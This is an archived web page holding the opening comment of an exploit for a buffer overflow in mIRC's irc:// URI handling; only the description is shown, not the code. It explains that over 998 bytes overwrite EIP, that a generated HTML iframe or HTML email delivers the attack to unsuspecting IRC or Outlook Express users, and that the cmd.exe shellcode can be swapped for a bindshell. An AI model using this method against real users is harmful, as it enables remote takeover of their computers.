<html><head><title>mIRC 6.1 "IRC" Protocol Remote Buffer Overflow Exploit
</title></head><pre>/** remote mirc &lt; 6.11 exploit by blasty
 **
 ** TESTED ON: Windows XP (No SP, Ducth) Build: 2600.xpclient.010817-1148
 **
 ** A few days ago, I saw a mIRC advisory on packetstorm [1] and was surprised
 ** nobody had written an exploit yet. So I decided to start writing one.
 ** Since this was my first time coding a exploit for windows, it took some
 ** research before I got the hang of it. (Ollydbg is much more confusing then GDB btw :P)
 **
 ** This exploits (ab)uses the bug in irc:// URI handling. It contains a buffer-
 ** overflow, and when more then 998 bytes are given EIP will be overwritten.
 ** 
 ** At first I was thinking of a simple solution to get this exploitable. Since
 ** giving an URI with &gt; 998 chars to someone on IRC is simply NOT done :)
 ** Then I remember the iframe-irc:// flaw found by uuuppzz [2]
 **
 ** This exploit will write an malicious HTML file containing an iframe executing the
 ** irc:// address. So you can give this to anyone on IRC for example ;)
 ** The shellcode included does only execute cmd.exe, because I don't want to be this
 ** a scriptkiddy util. But, replacing the shellcode with your own is also possible.
 ** An 400 bytes shellcode (bindshell etc.) easily fits in the buffer, but it may require
 ** some tweaking.
 ** After exiting the cmd.exe mIRC will crash, so shellcode its not 100% clean, but who carez :)
 **
 ** Oh yeah, I almost forgot.. this exploit also works even if mIRC isn't started.
 ** mIRC will start automatically when an irc:// is executed, so you can also send somebody
 ** and HTML email containing the evil HTML code. (only for poor clients like Outlook Express :P)
